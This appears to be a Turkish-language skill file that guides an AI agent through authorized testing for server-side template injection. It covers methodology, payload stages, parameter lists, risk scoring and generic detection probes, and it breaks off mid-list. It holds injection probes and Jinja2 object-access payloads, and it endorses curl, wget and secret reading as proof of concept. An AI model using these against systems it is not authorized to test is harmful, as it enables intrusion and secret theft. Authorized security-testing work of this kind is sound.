---
name: ssti-testing
description: SSTI (Server-Side Template Injection) tespiti, fingerprinting, context detection, engine-specific exploitation ve raporlama için kapsamlı, tek parça test skill'i. Yalnızca yetkilendirilmiş bug bounty / pentest / CTF ortamlarında kullanılır.
---

# SSTI (Server-Side Template Injection) — Kapsamlı Test Skill'i (Tek Parça)

## 0. Amaç, Kapsam ve Güvenlik Sınırı

### 0.1 Kapsam

**Kapsam içi:** Server-Side Template Injection (SSTI) — tüm türleri
(reflected, blind, stored, indirect, out-of-band) ve tüm büyük template
engine aileleri (Python, Java, PHP, Ruby, Node.js, .NET, Go, Perl).

**Kapsam dışı:** XSS, SQLi, Command Injection, saf EL (Expression
Language) Injection (Thymeleaf/SpEL bağlamında SSTI ile karışabilir —
ayrım aşağıda §6 Type Confusion bölümünde açıklanmıştır), CSTI
(Client-Side Template Injection — AngularJS/Vue tarayıcı render'ı, bkz.
§8.4 False Positive bölümü), ve genel "unsafe attribute/property access"
(template motoru hiç devreye girmeden yapılan obje erişimi — bkz. §6
Type Confusion).

### 0.2 Etik / Güvenlik Sınırı

Testler yalnızca yetkilendirilmiş scope içinde yapılır. **Gerçekten
gerekli olan tek sınırlar:**
- Dosya/veri **silme veya değiştirme yok**.
- **Kalıcı** sistem/konfigürasyon değişikliği **yok**.
- **Reverse shell veya kalıcı C2 yok** (çoğu bug bounty programının
  açıkça yasakladığı bir sınırdır).
- Kasıtlı ağır **DoS yok**.
- Test **scope'un dışına sıçramaz** (başka müşteri/tenant verisine
  erişmek gibi).

**Bunların dışında kalan her şey serbesttir** — `id`, `whoami`, `curl`,
`wget`, `ping`, `sleep N` gibi yaygın kabul gören non-destructive PoC
komutları; scope içindeki hassas/ayrıcalıklı (admin) veriye erişimin
gösterilmesi; config/secret/env değişkeni okuma — bunlar bir bug bounty
raporunun "gerçek etkiyi kanıtlama" gereğinin normal ve beklenen
parçasıdır. Bu skill boyunca gereğinden fazla genelleşmiş "şunu da
yapma" kuralları **bilinçli olarak eklenmemiştir** — aşırı
kısıtlayıcılık gerçek zafiyetlerin kaçırılmasına (false negative) yol
açar. `{{config}}`, `{{self}}` gibi çıktılar "side-effect-free" (kalıcı
değişiklik yapmıyor) olsa da otomatik "zararsız/safe" sayılmaz — hedefe
göre gerçekten hassas bilgi (secret key, credential) sızdırabilirler;
bu ayrım §10 Confirmation/Impact bölümünde detaylandırılmıştır.

---

## 1. Genel Metodoloji Akışı

Bu section, skill'in **zorunlu execution contract'ıdır**. Agent önce scope'u
doğrular; ardından yalnızca elde edilen sinyale göre ilgili layer'a geçer.
Aşağıdaki sıra bir "her endpoint'te her şeyi çalıştır" checklist'i değildir.

### 1.1 Layer modeli

```text
Layer 1 — Discovery / Source / Sink
  §2-4: aday keşfi, source→sink akışı ve SSTI sink doğrulaması

Layer 2 — Generic Detection / Context
  §5-6: evaluation kanıtı, context ve SSTI olmayan benzer sınıflardan ayrım

Layer 3 — Fingerprinting / Engine Attribution
  §7 + §12: confidence seviyeli engine sinyalleri ve engine-specific profiller

Layer 4 — Boundary / Delivery
  §8-9: encoding/filter, stored/indirect/blind/OOB zincirleri

Layer 5 — Confirmation / Impact / Reporting
  §10-11 + §14-15: bağımsız kanıt, etki, modern mimari, raporlama ve araçlar
```

### 1.2 Signal → Decision → Action → Result

```text
Endpoint/parametre bulundu
  ↓
§2 Discovery & Risk Scoring
  ↓
SSTI sink sinyali var mı?
  ├─ Hayır → LOW PRIORITY / NOT YET CONFIRMED → düşük öncelik kuyruğuna al,
  │          kapatma (black-box'ta gerçek sink genelde görünmez — bkz. §9
  │          stored/indirect zincirler; yalnızca yüksek skorlu adaylar
  │          tükendiğinde tekrar değerlendir)
  └─ Evet → §3 Source→Sink + §4 Sink Discovery
              ↓
              Evaluation sinyali var mı?
              ├─ Hayır → §6 context/type-confusion veya §8 encoding/filter
              │          sinyali varsa sınırlı devam; yoksa INCONCLUSIVE/NEGATIVE
              └─ Evet → §5 Generic Detection → §6 Context
                          ↓
                          Engine sinyali var mı?
                          ├─ Evet → §7 Fingerprinting → ilgili §12 profiline dallan
                          └─ Hayır → düşük maliyetli delimiter/context varyantı
                                     ile sınırlı fingerprinting
                          ↓
                          Stored/async/OOB sinyali var mı?
                          ├─ Evet → §9
                          └─ Hayır → §10 Confirmation
                          ↓
                          Geçerli bir Eksen-1 evidence kategorisi VE
                          negatif kontrol var mı? (§8.3/§8.4 — TEK
                          kategori yeterlidir, "bağımsız" ikinci bir
                          kategori ŞART DEĞİLDİR)
                          ├─ Evet → Confirmed → Impact → §14 Reporting
                          └─ Hayır → eksik olan unsuru tamamla (negatif
                                     kontrol mü eksik, yoksa hiç geçerli
                                     bir Eksen-1 kategorisi mi yok);
                                     bütçe dolarsa dur
```

**Karar kayıt sözleşmesi:** Her dallanmada agent mümkün olduğunca şu ilişkiyi
kaydetmelidir:

```text
input/signal → decision → action → observed result → next action
```

Aynı `(endpoint, parameter, context, payload-family, engine-hypothesis,
evidence-category)` kombinasyonu daha önce denenmişse yeniden çalıştırılmaz.
Bu state kuralının somut şeması ve alan tanımları §2 Duplicate Önleme'de
verilmiştir; burada ve orada kullanılan tuple **birebir aynıdır**.

### 1.3 Signal önceliği ve fail-safe

- **Strong signal** (ör. engine-specific error) → doğrudan ilgili fingerprint/
  profile dalına geç; gereksiz generic probe'ları tekrarlama.
- **Medium/weak signal** → tek başına confirmed kabul etme; geçerli bir
  Eksen-1 evidence kategorisi + negatif kontrol toplamaya devam et
  (§8.3/§8.4 — ikinci bir **farklı** kategori şart değildir).
- **Delivery/filter signal** (403, encoding farkı, sanitizer davranışı) →
  detection başarısızmış gibi bypass yağdırma; önce §8 sırasını uygula.
- **Stored/async signal** → reflected response'u zorlamaya devam etmek yerine
  §9 zincirini haritala.
- **CSTI sinyali** → ham HTTP response'u kontrol et; yalnızca browser-side
  render varsa SSTI olarak sınıflandırma.
- **Belirsizlik** → daha agresif payload yerine daha düşük riskli bir sonraki
  evidence kategorisini seç veya INCONCLUSIVE ile dur.
- **Rate-limit/WAF engeli** baseline'ı da etkiliyorsa sonucu "test edilemedi"
  olarak tut; engeli güvenlik kanıtı sayma.
- **Reflection noktası ilk yanıttan zaten görünüyorsa** → §6 Context
  Detection'ı katı sırayla (generic evaluation'dan sonra) bekletmek
  zorunlu değildir; input'un HTML attribute/string-literal/JS-context
  gibi hangi konumda yansıdığı P1 ile P2 arasında **opsiyonel olarak
  öne çekilebilir** — çünkü context, ilk denenecek delimiter/escape
  hipotezini belirler (örn. bir `value="USER_INPUT"` attribute
  context'inde ham `{{...}}` yerine önce `"}}{{...}}{{"` gibi
  context'ten kaçan bir varyant denemek daha az request'le sonuca
  ulaştırır). §1.1'deki Layer sırası genel disiplini korur, bu yalnızca
  erken ve ucuz bir gözlem varsa onu kullanma izni verir.

### 1.4 Hızlı Referans Tablosu

1.1-1.3'teki karar modelinin bölüm numaralarına düz bir eşlemesi —
detaylı akış için yukarısı, hızlı "bu adım hangi bölümde" bakışı için
burası:

```
1.  Discovery + Sink Discovery        (§2, §4)
2.  Source → Sink doğrulaması          (§3)
3.  Generic Detection (arithmetic: 6666*6666 → 44435556)  (§5)
4.  Context Detection                   (§6)
5.  Engine Fingerprinting (confidence sinyalleri)  (§7)
6.  Engine-Specific Detection/Confirmation (§12 — Engine Profilleri)
7.  Stored / Indirect / Blind SSTI      (§9)
8.  Confirmation (bağımsız kanıt)       (§8, §10 Confirmation)
9.  False-Positive Elimination          (§8)
10. Impact Assessment                    (§10 Confirmation/Impact)
11. Raporlama                            (§14)
```

### 1.5 Payload Stage Model (P0–P6)

Herhangi bir engine için bir payload'ı çalıştırmadan önce, o payload'ın
zincirde **hangi aşamada** olduğunu bil — agent'ın "direkt RCE
payload'ına atla" hatasını yapmasını engelleyen basit bir disiplin:

```
P0 — Reflection            : marker girdinin yansıdığını doğrula (§2, §4)
P1 — Syntax recognition    : motorun delimiter'ı tanınıyor mu ({{ }}, <% %> vb.)
P2 — Evaluation             : generic arithmetic/string probe derleniyor mu (§5)
P3 — Context discovery      : hangi context'teyiz, hangi built-in obje erişilebilir (§6, §7)
P4 — Object/helper discovery: config/self/request gibi özel değişkenler, helper zinciri
P5 — Capability confirmation: sandbox var mı, hangi fonksiyon/gadget erişilebilir
P6 — Impact confirmation    : side-effect-free komut (id/whoami) veya OOB callback
```

Örnek (Jinja2 üzerinden, §12.1'deki payload'lar bu sıraya karşılık
gelir):

```
P0: AAA_SSTI_1234
P1: {{AAA_SSTI_1234}}
P2: {{6666*6666}}
P3: {{config}}                (context/obje keşfi başlıyor)
P4: {{config.__class__}}      (helper/obje zinciri)
P5: sandbox/erişim kontrolü (SandboxedEnvironment var mı)
P6: os.popen('id') zinciri (bkz. §12.1) veya kontrollü OOB callback
```

Bu model **her mevcut payload'ı yeniden etiketlemeyi zorunlu kılmaz** —
amaç, yeni bir engine/payload eklerken veya canlı bir testte "şu an
hangi aşamadayım, bir sonraki adım ne" sorusuna hızlı cevap
verebilmektir. §14.2'deki `payload_stage` metadata alanı bu modele
karşılık gelir.

### 1.6 Engine-Seviyesi Fallback Zinciri Örneği

Bir payload bloklandığında "hemen daha agresif bir payload dene"
yerine, aynı stage içinde **alternatif syntax** dene, ancak bloklandı
sonrası mutlaka §1.3'teki fail-safe kurallarını uygula. Jinja2 üzerinden
örnek zincir (mevcut §12.1 payload'larına referansla):

```
{{6666*6666}} başarısız
   ↓
{{6666*'6666'}} (string çarpımı — farklı bir evaluation yolu) dene
   ↓
başarısız
   ↓
{{config}} dene
   ↓
başarısız (muhtemelen sandbox veya değişken yok)
   ↓
version biliniyor mu?
 ├─ evet → o versiyona özgü gadget dene (§12.1)
 └─ hayır → §7 Fingerprinting'e dön, düşük riskli delimiter/context
            varyantıyla motoru netleştir
   ↓
sandbox sinyali (engelleme mesajı, `__class__` gibi erişimlerin
açıkça reddedilmesi) var mı?
 ├─ evet → §12.1 "Sandbox" notundaki bypass'ları dene
 └─ hayır → configuration/application-specific dala geç
```

Bu zincir yalnızca bir **örnektir**; her engine profilinde ayrı ayrı
yazılı bir fallback ağacı tutmak dosyayı gereksiz şişirir — mantığı
kavradıktan sonra agent bunu her engine'e uygulayabilir.

### 1.7 Prerequisite Gate — P5/P6 Payload'ları Doğrudan Ateşlenmez

**Kural:** §1.5'teki Payload Stage Model'de **P5 (capability
confirmation)** veya **P6 (impact confirmation)** aşamasındaki bir
payload (yani bir RCE/gadget zinciri, dosya okuma, OOB callback),
önkoşulları (`prerequisites` — §14.2) daha önceki bir aşamada
(P3/P4) elde edilmiş kanıtla **doğrulanmadan** çalıştırılmaz. Payload
seçimi payload'ın "etkileyici" olmasına göre değil, **mevcut kanıtın
o payload'ın önkoşuluyla eşleşmesine** göre yapılır. Somut örnek
(Jinja2 üzerinden, §12.1'deki payload'larla):

```text
IF:
  evaluation = confirmed (P2, §5)
  AND engine_hypothesis = Jinja2 (leading, §7)
  AND sandbox_status = unknown
THEN:
  → P4 capability discovery çalıştır: {{config}} (bkz. §12.1)
  ↓
  IF config erişilebilir VE __class__/__globals__ erişimi engellenmiyor:
    → sandbox_status = absent → P5 payload'ına geç (gadget seçimi)
  IF config erişimi engellendi VEYA açık bir sandbox hata mesajı alındı:
    → sandbox_status = present → P6'ya atlama, önce §12.1 "Sandbox"
      notundaki bypass'ları veya application-specific dalı dene
  IF config tanımsız/yok:
    → engine_hypothesis'i düşür (§7 Hipotez Takibi'ne dön), P6
      payload'ı **tetiklenmez**
```

Bu, dosyadaki her payload zincirinin IF/THEN pseudocode'a çevrilmesi
gerektiği anlamına gelmez (bu, payload library'nin okunabilirliğini
düşürür ve orantısız bir yeniden yazım gerektirir) — amaç, agent'ın
**her P5/P6 payload'ından önce** kendine bu üç soruyu sorması: "hangi
önkoşulu varsayıyorum, bu önkoşulu hangi kanıtla doğruladım, kanıt
yoksa bir alt aşamaya (P3/P4) geri dönüyor muyum?"

**Metadata'sız (etiketlenmemiş) payload'lar için varsayılan davranış:**
§14.2'deki payload metadata şeması, dosyadaki 150+ payload'ın **geriye
dönük olarak tek tek etiketlenmesini** gerektirmez (bu, orantısız bir
emek olurdu ve gerçek değer katmaz). Ancak bu, eski/etiketsiz bir
RCE/gadget payload'ının bu Prerequisite Gate kuralının **dışında**
kaldığı anlamına gelmemelidir — aksi halde kural sistematik olarak
delinmiş olur. Bu yüzden: **açık `payload_stage` metadata'sı olmayan
her RCE/gadget/dosya-okuma/OOB payload'ı, otomatik olarak P5/P6 kabul
edilir** ve bu bölümdeki kural aynen uygulanır — önkoşul olarak o
profildeki "Sandbox" ve "Generic detection" notları kullanılır (yani:
o payload'ı denemeden önce, aynı profildeki sandbox notunun işaret
ettiği kanıt zaten elde edilmiş olmalı). **Somutlaştırma:** pratikte bu,
"o payload'ın hemen üstündeki 'Generic detection' adımının pozitif
sonuç verdiğini VE 'Sandbox' notunun payload'ı engelleyen bir durum
tanımlamadığını doğrula" anlamına gelir — yani önkoşul, ayrı bir alanda
aranmaz, her zaman **aynı alt başlık içinde, payload'dan hemen önceki
metindedir**.

---

## 2. Discovery & Risk Scoring

### Endpoint/parametre adayları nereden çıkarılır
- Recon sonuçları: canlı host listesi, JS bundle'ları, OpenAPI/Swagger,
  GraphQL introspection, Burp/proxy history.
- Teknoloji fingerprint (CMS/framework tespiti) → §13'deki CMS→engine
  tablosuyla eşleştirilerek hangi engine ailesine bakılacağı önceden
  daraltılır (bu eşleme **varsayılan**dır, kesin değildir).

### Yüksek öncelikli endpoint kategorileri (azalan risk sırası)
1. E-posta/bildirim şablonu oluşturma/önizleme
2. PDF / rapor / döküman üretimi
3. CMS tema/şablon editörü
4. Admin panelinde "özel HTML / imza / banner" alanları
5. Arama/filtre/sıralama (`sort`, `filter`, `field`, `expr` gibi — bkz.
   §6 Type Confusion; bu parametrelerde pozitif sonucu doğrudan "SSTI"
   etiketlemeden önce object-access/SSTI ayrımını yap)
6. Export/import (özellikle şablon tabanlı export formatları)
7. Form/sayfa builder, no-code otomasyon araçları (workflow builder'lar
   — bkz. §11 Modern Mimari Notları, bu tür
   araçlarda giderek yaygınlaşan bir attack surface)
8. Hata sayfası/log görüntüleme (kullanıcı verisi hata mesajına
   template olarak basılıyorsa)

### Yüksek öncelikli parametre adları

Aşağıdaki liste, dosyanın kendi endpoint kategorileriyle (yukarıdaki
liste) **birebir eşleşecek şekilde** kategorize edilmiştir — her grup,
hangi endpoint kategorisinin karşılığı olduğunu gösterir. Bu, önceki
sürümde fark edilen bir tutarsızlığı da giderir: endpoint kategorisi #5
metninde `field`/`expr` örnek gösteriliyordu ama parametre listesinde
yoktu; PDF/rapor (#2), no-code/workflow (#7) ve hata sayfası (#8)
kategorilerinin de listede hiç karşılığı yoktu.

**Şablon/görünüm çekirdek adları (genel):**
`template`, `tpl`, `tmpl`, `templateName`, `templateId`, `templatePath`,
`templateEngine`, `templateDir`, `view`, `viewName`, `viewPath`,
`viewEngine`, `viewsDir`, `layout`, `layoutName`, `partial`,
`component`, `widget`, `page`, `theme`, `themeName`, `skin`

**İçerik/mesaj gövdesi (genel):**
`content`, `body`, `message`, `msg`, `text`, `html`, `subject`,
`title`, `greeting`, `signature`, `footer`, `header`

**E-posta/bildirim şablonu (endpoint kategorisi #1):**
`email`, `emailTemplate`, `emailBody`, `emailSubject`, `notification`,
`notificationTemplate`, `sms_body`, `push_message`, `customMessage`,
`customText`, `customHtml`, `banner_html`, `custom_html`,
`page_content`

**PDF/rapor/döküman/fatura (endpoint kategorisi #2 — önceki eksiklik):**
`report`, `reportTemplate`, `document`, `docTemplate`, `invoice`,
`invoiceTemplate`, `receipt`, `receiptTemplate`, `letter`,
`letterTemplate`

**Arama/filtre/sıralama — type confusion riski yüksek (endpoint
kategorisi #5, bkz. §6 Type Confusion; pozitif sonucu doğrudan "SSTI"
etiketlemeden önce object-access/SSTI ayrımını yap):**
`filter`, `sort`, `field`, `expr`, `expression`, `formula`, `attr`,
`order_by`, `orderBy`, `search`, `query`, `q`, `keyword`, `term`

**No-code/workflow builder (endpoint kategorisi #7, bkz. §11):**
`workflow`, `node_expression`, `automation_rule`, `macro` (wiki/CMS
makro sistemleri — XWiki/Confluence benzeri, bkz. §12.2)

**Hata sayfası/log (endpoint kategorisi #8):**
`error_message`, `error_template`, `log_format`

**Render/context/engine internals (bazı framework'lerde parametre veya
query-string olarak expose olabilir — özellikle debug/preview
modlarında):**
`render`, `renderTo`, `renderToString`, `context`, `model`,
`modelAndView`, `locals`

**Taslak/önizleme/klonlama/parça:**
`preview`, `previewTemplate`, `draft`, `draftTemplate`, `clone`,
`snippet`, `fragment`, `section`, `block`, `slot`, `slotContent`

**Basit ama klasik:**
`name` (HackTricks'in temel örneğinde de `?name=` üzerinden gösterilir)

**Bilinçli olarak DIŞARIDA bırakılanlar:** `value`, `data`, `input`,
`output`, `label`, `caption`, `description`, `format`, `formatString`,
`config`, `settings`, `params`, `action`, `handler`, `code`, `type`,
`key`, `id`, `status`, `state` gibi son derece jenerik terimler bu
listeye **kasıtlı olarak eklenmemiştir** — bunlar hemen her uygulamada,
her parametrede geçebilir; bu listeye eklenmeleri Risk Skoru
tablosundaki "+3 parametre adı eşleşmesi" sinyalini anlamsızlaştırır ve
gürültüyü artırır (bkz. §5 "büyük/deterministic/nadir" prensibiyle
aynı mantık — burada da nadirlik/ayırt edicilik esastır, kapsayıcılık
değil). Template engine adlarının kendisi (örn. `twig`, `smarty`,
`freemarker`, `handlebars`) de bu listeye **parametre adı olarak**
eklenmemiştir — bunlar genelde bir parametrenin **değeri** olarak
görülür (örn. `?engine=twig`), parametre adı olarak değil; böyle bir
durumda bu bir fingerprinting sinyalidir (§7), Discovery aşamasının
konusu değildir.

### Risk skoru (basit toplama modeli — örnek, standart değil)
| Sinyal | Puan |
|---|---|
| Parametre adı eşleşmesi | +3 |
| Endpoint kategorisi eşleşmesi | +3 |
| Response'ta template-hata sinyali (örn. "unexpected token") | +4 |
| Teknoloji fingerprint bilinen bir engine'e işaret ediyor | +2 |
| Stored/indirect zincir şüphesi (veri kaydediliyor, başka yerde kullanılıyor) | +2 |

Toplam ≥5 olan (endpoint, parametre) çiftleri generic detection
kuyruğuna öncelikli alınır. Düşük skorlu adaylar yalnızca yüksek
skorlu adaylar tükendiğinde test edilir.

### Duplicate önleme (agent state)
Bu, §1.2'deki "Karar kayıt sözleşmesi"nde tanımlanan **aynı** state
mekanizmasıdır — burada somut şeması verilir. Her denenen kombinasyonu
şu 6 alanla bir state tablosunda tut:

| Alan | Açıklama |
|---|---|
| endpoint | Test edilen URL/route |
| parameter | Etkilenen parametre adı |
| context | plain/HTML/attribute/string/expression (§6) |
| payload_family | generic-arithmetic / string-eval / RCE-gadget / OOB vb. |
| engine_hypothesis | O anki lider engine tahmini (veya "unknown") |
| evidence_category | reflection/evaluation/fingerprint/context/stored-indirect/OOB (§8.3) |

Yeni bir probe denemeden önce bu tabloyu kontrol et — aynı 6'lı
kombinasyon (`endpoint, parameter, context, payload_family,
engine_hypothesis, evidence_category`) daha önce denenmişse tekrar
çalıştırılmaz. `engine_hypothesis` alanı önemlidir çünkü aynı payload
farklı bir engine hipotezi altında tekrar denenmeye değer olabilir
(§7 Hipotez Takibi lider değiştiğinde).

---

## 3. Source → Transformation → Template Sink Modellemesi

Bir adayı test etmeden önce şu soruyu açıkça sor: **"Bu input gerçekten
template engine'in derleme/evaluation sink'ine mi ulaşıyor, yoksa bir
transformation'da mı tükeniyor?"**

```
(A) SSTI'ye yol açabilecek akış:
parameter → controller → Template(user_input)   [sink — input template
                                                   KAYNAĞININ kendisi]

(B) SSTI'ye yol açmayan akış (aynı parametre olsa bile):
parameter → controller → sanitizer → database → business logic
   → sabit (geliştiricinin yazdığı) template'in bir DEĞİŞKEN DEĞERİ
     olarak kullanılır — normal/güvenli template kullanımı
```

**Pratik ayrım testi:** Motorun kendi expression sözdizimini (`{{ }}`,
`${ }` vb.) parametre değeri olarak dene. Eğer bu sözdizimi **derleniyor**
(yalnızca düz metin olarak reflect edilmiyor) → (A) tipi, SSTI adayı.
Yalnızca düz metin olarak yansıyorsa → muhtemelen (B) tipi, bu aday için
SSTI aranmaz (başka bir zafiyet sınıfı — örn. XSS — söz konusu olabilir,
kapsam dışı). HackTricks'in temel örneğinde bu ayrım şöyle
gösterilir: `greeting=data.username` gibi bir parametreyi
`greeting=data.username}}hello` şekline getirip çıktının dinamik mi
sabit mi olduğuna bakmak — eğer `}}` kapatıcısından sonraki `hello`
metni de işleniyorsa (yani template'in geri kalanı motor tarafından
derlenmeye devam ediyorsa), bu (A) tipi bir sink'e işaret eder.

### 3.1 XSS ile Ayrım — Aynı Delimiter, Farklı Sink

`{{...}}` veya `${...}` gibi bir dizinin response'ta reflect olması,
tek başına ne SSTI'yi ne de XSS'i kanıtlar — hangisi olduğu, girdinin
**hangi motora** ulaştığına bağlıdır:

- Girdi **sunucu tarafındaki template engine'e** (Jinja2, Twig vb.)
  bir template kaynağı olarak ulaşıyorsa ve orada **derleniyorsa** →
  SSTI (bu bölümdeki (A) akışı).
- Girdi sunucuda hiç işlenmeden ham HTML/JS olarak response'a
  yazılıyor ve **tarayıcıda** yorumlanıyorsa (DOM'a enjekte oluyor,
  bir `<script>` bağlamında çalışıyor) → XSS, bu skill'in kapsamı
  dışında.
- Bazı frontend framework'leri (AngularJS/Vue) `{{...}}` sözdizimini
  **istemci tarafında** kendi motorlarıyla evaluate eder — bu CSTI'dir
  (§8.4'te ayrıca ele alınır), sunucuyu etkilemez.

**Ayrım testi, bu skill'de zaten kullanılan mekanizmanın aynısıdır:**
§5'teki differential comparison (`6666*6666` → `44435556` vs
`6666*6665` → farklı bir sonuç) yalnızca **sunucudan dönen ham HTTP
response'ta** (view-source/curl çıktısı, tarayıcı render'ı değil)
çalıştırılır. Ham response'ta hesaplanmış sonuç görünüyorsa → SSTI.
Ham response'ta hâlâ değiştirilmemiş `{{6666*6666}}` yazıyor ve sonuç
yalnızca tarayıcıda (DevTools/rendered DOM'da) görünüyorsa → sunucu
hiç evaluate etmemiştir, bu ya XSS ya da CSTI'dir — SSTI olarak
raporlanmaz. Kısacası: **"nerede çalıştığı" sorusunun cevabı, "hangi
ham response'ta hesaplanmış sonucun göründüğü" sorusuyla aynıdır.**

## 4. SSTI Sink Discovery

Parametre adlarının yanı sıra, mümkünse **sink pattern'lerini** de ara.
Kaynak koda erişim varsa (açık kaynak proje, expose `.git`, JS bundle,
hata mesajlarında dosya yolu/fonksiyon adı) şu tür isimler bir sinyaldir
(yalnızca örnek — gerçek pattern framework/engine'e göre değişir):

- `render_template_string(...)`, `Template(...).render(...)` (Jinja2/Python)
- `compile(...)`, `parse(...)`, `evaluate(...)` (genel)
- `renderInline(...)` (Rails/ERB)
- `Twig\Environment::createTemplate(...)` (Twig)
- `new freemarker.template.Template(...)` (Freemarker)
- `renderEmail(...)`, `renderPdf(...)`, `renderReport(...)` (uygulamaya
  özel isimlendirme, e-posta/PDF/rapor motorlarında sık görülür)
- `preview(...)`, `generate(...)` (CMS/no-code platformlarda şablon
  önizleme uçlarında sık görülür)

**Black-box (kaynak koda erişim yok) senaryoda** sink discovery pratikte
§2'deki attack surface taramasıyla örtüşür: yüksek öncelikli endpoint
kategorileri (e-posta/PDF/rapor oluşturma vb.) zaten bu sink'lerin
dışarıdan gözlemlenebilir izleridir. Kısmi kaynak erişimi varsa
yukarıdaki pattern'ler ek bir sinyal katmanı olarak kullanılır.
SecLists projesindeki `Fuzzing/template-engines-special-vars.txt` gibi
wordlist'ler, farklı engine ortamlarında tanımlı olan özel değişkenleri
(örn. `config`, `self`, `request`, `session`) keşfetmek için sink
discovery aşamasında kullanılabilir.

---

## 5. Generic SSTI Detection

### Kavramsal Zincir — Evaluation Kanıtı ile Engine Attribution Ayrı

```
Reflection
   ↓
Syntax recognition   (motor payload'ı en azından "tanıyor" mu?)
   ↓
Expression evaluation (gerçekten hesaplanıyor mu?)
   ↓
Controlled transformation (deterministic, öngörülebilir bir dönüşüm var mı?)
   ↓
Negatif kontrol doğrulaması (§5.1 — farklı payload FARKLI sonuç veriyor mu?)
   ↓
Engine attribution     (hangi engine — ayrı bir aşama, bkz. §7 Fingerprinting)
```

Her adım, kendinden öncekinin **gerekli ama tek başına yeterli
olmadığı** bir kanıt katmanıdır. Yalnızca reflection ya da yalnızca
"beklenen sonuç göründü" SSTI'yi kanıtlamaz. **Terminoloji notu —
§10.2/§8.4 ile karıştırılmasın:** Yukarıdaki "Negatif kontrol
doğrulaması" adımı, §5.1'deki differential comparison tekniğidir ve
**aynı** Eksen-1 kanıt kategorisi (evaluation) içinde kalır — bu, §8.4'ün
"confirmed" için gerektirdiği **farklı bir ikinci evidence kategorisi**
ile **aynı şey değildir**. Bu diyagramdaki sıralama bir kanıt
**olgunlaşma** sürecini gösterir (reflection'dan attribution'a doğru
artan güven), "confirmed" etiketi için zorunlu bir **kategori sayısı**
kuralı değildir — o kural yalnızca §8.4'te tanımlıdır: tek bir Eksen-1
kanıt türü (evaluation/stored-indirect/OOB'dan biri) + geçerli bir
negatif kontrol, "confirmed" için yeterlidir.

### Fuzzing ile İlk Tarama (Polyglot — Düşük Öncelikli Triage)

HackTricks ve TInjA gibi araçların kullandığı klasik ilk-tarama
polyglot'u:

```
${{<%[%'"}}%\
```

Bu diziyi bir input'a gönderip normal veri ile karşılaştırıldığında
şu farklar SSTI şüphesi doğurur: hata fırlatılması (bu aynı zamanda
engine'i ele verebilir), payload'ın kısmen ya da tamamen response'tan
eksik olması (motorun bunu normal veriden farklı işlediğine işaret
eder). **Önemli düzeltme:** Bu teknik güvenilir bir fingerprinting
mekanizması **değildir**, opsiyonel ve düşük öncelikli bir triage
tekniğidir. Riskleri: parse error'a yol açabilir (yorumlanması zor bir
sinyal), WAF'ı tek delimiter probe'larından daha kolay tetikleyebilir,
uygulamanın wrapper/sanitizer katmanını beklenmedik etkileyebilir,
sonuçların yorumlanması tek-delimiter probe'lara göre belirsizdir. Bu
nedenle polyglot probing yalnızca standart sıralı fingerprinting
tükendiğinde veya son çare olarak denenmelidir.

### Aritmetik Probe Seçimi — KRİTİK KURAL

**`7*7 → 49` gibi küçük ve yaygın sonuçlar üreten probe'lar ASLA
KULLANILMAZ.** Bu tür sonuçlar (`49`, `123`, `100` vb.) response
içinde tesadüfen (sayfa numarası, sayaç, ID, tarih vb. olarak) bulunma
ihtimali yüksek olduğundan false-positive riskini artırır. Bunun
yerine **büyük, deterministic ve response içinde doğal olarak bulunma
ihtimali düşük** bir sonuç kullanılır. Bu kural, **çarpma işlemine ek
olarak çıkarma işlemini de** aynı ağırlıkta içerir — pratik bug bounty
deneyimi, bazı hedeflerde yalnızca çarpma denenip çıkarma hiç
denenmediğinde SSTI'nin gözden kaçabildiğini göstermiştir (motorun
çarpma operatörünü farklı bir code path'te işlemesi, ya da çarpma
sonucunun context'te bir nedenle bastırılması gibi durumlar mümkündür).
Bu yüzden iki operatör de **standart probe setinin eşit ağırlıklı
parçasıdır**, biri diğerinin yedeği değildir.

**Tasarım kararı — tek bir ortak hedef değer:** İki operatör **kasıtlı
olarak aynı ham sonucu üretecek şekilde** seçilmiştir. Bu sayede agent,
hangi operatörü denediğine bakmaksızın response içinde **tek bir sabit
string** (`44435556`) arar — iki farklı "beklenen sonuç" değerini ayrı
ayrı takip etmesi gerekmez, bu da hem otomasyonu basitleştirir hem de
grep/regex tabanlı response taramasında hata payını azaltır:

> **Çarpma:** `6666*6666` → ham sonuç: **`44435556`**
> **Çıkarma:** `44444444-8888` → ham sonuç: **`44435556`**

Aranacak/karşılaştırılacak değer her zaman bu ortak ham temsildir —
**binlik ayraç kullanılmaz**; `"44,435,556"` gibi locale-specific
biçimler beklenen değer olarak alınmaz (bazı locale ayarları sayıyı
biçimlendirebilir; böyle bir durumda hem ham hem biçimlendirilmiş
varyant aranmalı, ama pozitif kabul için ham temsilin bulunması
yeterlidir).

Bu skill dosyasındaki engine-özgü örnekler, **mümkün olduğunda** bu
kurala göre yazılmıştır. **Ama dikkat — bu kural "her yerde aynı
sözdizimini kullan" demek değildir:** bu iki ifade **primary generic
canary**'dir, evrensel bir SSTI testi değil. Bazı motorlarda arithmetic
sözdizimi tamamen farklıdır (örn. Django Templates'te
`{{6666|add:6666}}`, Liquid'de `{{6666|times:6666}}` — bkz. §12.1,
§12.3) veya integer handling farklı davranabilir (bazı motorlarda büyük
sayı çarpımı overflow/precision sorunu yaşayabilir, çıkarma böyle bir
sorun yaşamayabilir — bu tam olarak iki operatörü birlikte kullanmanın
gerekçesidir). **Asıl ilke şudur:** sonucun (a) deterministic/
öngörülebilir, (b) response içinde tesadüfen bulunma ihtimali düşük
(küçük sayılardan kaçın) olması — motorun kendi native probe'u bu iki
şartı sağlıyorsa, yukarıdaki iki ifade yerine o probe tercih edilir.

### Aşamalı Generic Probe Sırası

Engine bilinmediğinde, düşük riskliden yükseğe doğru sırayla uygula.
Her probe'a biricik bir canary ekle (örn. `AAA_SSTI_<random>_ZZZ`).

1. **Marker-only (baseline):** `AAA_SSTI_1234_ZZZ` — yalnızca
   reflection/encoding/stripping davranışını öğrenmek için, evaluation'la
   ilgisi yok.
2. **Arithmetic — çarpma (delimiter matrisi), en yaygından başla:**
   `{{6666*6666}}` → `${6666*6666}` → `#{6666*6666}` →
   `<%= 6666*6666 %>` → `[[6666*6666]]` → `{{=6666*6666}}`
   Hepsini tek istekte değil, ayrı ayrı dene; ham sonucu `44435556`
   üreteni işaretle.
2b. **Arithmetic — çıkarma (aynı delimiter matrisiyle, çarpmadan
    bağımsız olarak dene, atlanmaz):**
   `{{44444444-8888}}` → `${44444444-8888}` →
   `#{44444444-8888}` → `<%= 44444444-8888 %>` →
